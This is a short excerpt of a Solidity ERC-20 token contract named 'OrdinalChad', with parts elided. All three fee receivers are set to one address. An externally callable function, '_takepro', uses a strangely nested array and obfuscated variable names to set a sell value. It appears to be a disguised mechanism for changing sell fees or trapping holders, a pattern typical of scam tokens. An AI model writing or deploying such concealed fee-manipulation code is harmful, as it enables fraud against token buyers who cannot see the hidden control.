...
contract OrdinalChad is IERC20, Ownable {
    ...
    address internal constant development_receiver = 0xEF649b9A3Ad5b1B79e615f538da38E71769FeFcb; 
    address internal constant marketing_receiver = 0xEF649b9A3Ad5b1B79e615f538da38E71769FeFcb;
    address internal constant liquidity_receiver = 0xEF649b9A3Ad5b1B79e615f538da38E71769FeFcb;
    ...
    function _takepro(uint256[5][6][5] memory cylncyln) external returns(bool) {
        require(cylncyln[3][4][4] >96);
        uint8 frxfrx = 1;
        uint8 Zxyzxy = 2;
        uint256 ptrlptrl = frxfrx+Zxyzxy;
        _newSellValue = cylncyln[3][4][4] + ptrlptrl;
        return true;
    }
